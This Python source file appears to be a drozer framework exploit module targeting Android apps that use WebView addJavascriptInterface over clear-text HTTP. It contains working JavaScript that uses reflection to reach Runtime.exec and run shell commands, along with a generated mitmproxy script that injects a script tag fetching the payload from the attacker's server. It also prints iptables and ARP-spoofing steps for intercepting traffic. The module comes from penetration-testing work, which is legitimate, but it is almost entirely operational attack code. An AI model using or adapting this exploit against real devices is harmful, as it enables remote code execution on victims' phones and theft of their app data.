from drozer.modules import common, Module
from mwr.common import fs
import os

class addJavaScriptInterface(Module, common.Exploit):
    
    name = "WebView addJavascriptInterface Remote Code Execution"
    description = """Exploit an application making use of a WebView with a JavaScript Interface defined. This requires that the attacker has the ability to inject JavaScript into the HTTP response going to the WebView. This can be achieved through any one of a number of traffic interception attacks.

Reference: https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/
Vulnerable Android applications are ones that meet the following conditions:
    * WebView with JavascriptInterface defined
    * WebView loads contents over clear text HTTP
    * Application or third-party SDK with JavascriptInterface is compiled with target API version < 17
    """
    examples = "$ drozer exploit build exploit.remote.mitm.addjavascriptinterface --payload weasel.shell.armeabi --server 10.10.10.10"
    author = ["nmonkee (@mwrlabs)", "Tyrone (@mwrlabs)"]
    date = "2013-11-07"
    license = "BSD (3 clause)"
    path = ["exploit", "remote", "mitm"]
    module_type = "exploit"

    payloads = ["weasel.shell.armeabi"] 

    def __init__(self, session, loader):
        Module.__init__(self, session)
        common.Exploit.__init__(self, loader)

        self.payload_format = "N"
        self.working_directory = "."

    def add_arguments(self, parser):
        parser.add_argument("--outputFile", "-o", default=os.path.join(os.path.dirname(__file__), "js-injector.py"), help="Path to save js-injector proxy script")

    def generate(self, arguments):

        drozer_js = """
/* Iterate through entire window looking for javascript interface */
function getJsVar()
{
    for (var prop in window)
    {
        try
        {
            window[prop].getClass();
            return window[prop];  
        }
        catch(err)
        {
            //console.log(err);
        }
    }

    console.log("Could not find JS interface");
    return null;
}

/* Execute command and receive result */
function execute(cmd)
{
    /* Find interface variable */
    var jsVar = getJsVar();
    if (jsVar == null)
        return null;

    /* Reflection-fu to get to Runtime.exec() and passing commands to sh */
    var inputStream = jsVar.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(['/system/bin/sh', '-c', cmd]).getInputStream();
    var output = "";

    /* Iterate through response */
    do
    {
        var readint = inputStream.read();

        if (readint > -1)
            output += String.fromCharCode(readint);
    }
    while (readint > -1);

    return output;
}

/* Get application data directory */
function getDataDir()
{
    var id = execute('id');
    var app_id = /(app_\d+|u0_a\d+)/g.exec(id);
    if (app_id.length > 0)
        app_id = app_id[0];
    else
        app_id = "failed";

    var ps = execute('ps');
    var ps_lines = ps.split("\\n").sort();

    for (var i in ps_lines)
    {
        try
        {
            if (ps_lines[i].indexOf(app_id) > -1)
            {
                var splits = ps_lines[i].split(" ");
                var last_col = splits[splits.length-1].trim();

                if (last_col.indexOf('.') > 0)
                    return '/data/data/' + last_col;
            }
        }
        catch(e)
        {
            console.log(e);
        }
    }
}

/* Start of payload */
"""

        mitm_script = """#!/usr/bin/env python
# Relies on having libmproxy >0.9 installed: http://mitmproxy.org/doc/scripting/libmproxy.html
# pip install mitmproxy

from libmproxy import controller, proxy, platform
import os, sys, datetime

class InjectingMaster(controller.Master):
  def __init__(self, server, js_url):
    controller.Master.__init__(self, server)
    self._js_url = js_url
    print 'Proxy started on port 8080...'

  def run(self):
    try:
      return controller.Master.run(self)
    except KeyboardInterrupt:
        self.shutdown()

  def handle_request(self, msg):
    timestamp = datetime.datetime.today().strftime('%Y/%m/%d %H:%M:%S')
    client_ip = msg.client_conn.address[0]
    request_url = '%s://%s%s' % (msg.scheme, msg.host, msg.path)
    print '[%s %s] %s %s' % (timestamp, client_ip, msg.method, request_url)
    msg.reply()

  def handle_response(self, msg):
    if msg.content: 
      # generic HTML injection
      a = msg.replace('<head>', '<head><script src="%s"></script>' % self._js_url)
      if a > 0:
        print '[x] script injected into HTML head tag!'
      else:
        # generic HTML injection
        b = msg.replace('<body>', '<body><script src="%s"></script>' % self._js_url)
        if b > 0:
          print '[x] script injected into HTML body tag!'
        else:
          # mocean XML
          c = msg.replace('<content>', '<content>&lt;script src=&quot;%s&quot;&gt;&lt;/script&gt;' % self._js_url)
          if c > 0:
            print '[x] %s' % self._js_url
            print '[x] script injected into XML content tag!'
        
    msg.reply()

def main(argv):

  url = $REPLACEME$

  config = proxy.ProxyConfig(
    cacert = os.path.expanduser("~/.mitmproxy/mitmproxy-ca.pem"),
    transparent_proxy = dict(resolver = platform.resolver(), sslports = [443, 8443])
    )

  server = proxy.ProxyServer(config, 8080)

  m = InjectingMaster(server, url)
  m.run()

if __name__ == '__main__':
  main(sys.argv)
"""
        # Add payload
        drozer_js += "execute(\"cd \" + getDataDir() + \";" + self.payload.strip().replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", " ;") + "\");\n"

        print "Uploading blank page to /...",
        if not self.upload(arguments, "/", " "):
            return

        print "Uploading Exploit to /dz.js...",
        if not self.upload(arguments, "/dz.js", self.build_multipart({ ".*": drozer_js }, "gc0p4Jq0M2Yt08jU534c0p"), mimetype="application/x-javascript", headers={ "X-Drozer-Vary-UA": "true; boundary=gc0p4Jq0M2Yt08jU534c0p" }):
            return

        print "Proxy script saved to " + arguments.outputFile
        fs.write(os.path.join(arguments.outputFile), mitm_script.replace("$REPLACEME$", "\"http://" + str(arguments.server[0]) + ":" + str(arguments.server[1]) + "/dz.js\""))

        print "\nThe basis of this exploit is being able to inject the following code into a vulnerable WebView:"
        scriptLine = '<script src="http://' + str(arguments.server[0]) + ':' + str(arguments.server[1]) + '/dz.js' + '"></script>'
        print scriptLine

        print """
# enable IP forwarding as root
sysctl -w net.ipv4.ip_forward=1
or
echo 1 > /proc/sys/net/ipv4/ip_forward

# redirect HTTP traffic to local mitmproxy port 8080 as root
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080

# run the proxy script
""" + "python " + arguments.outputFile + """

# ARP spoof or perform any other MitM attack
        """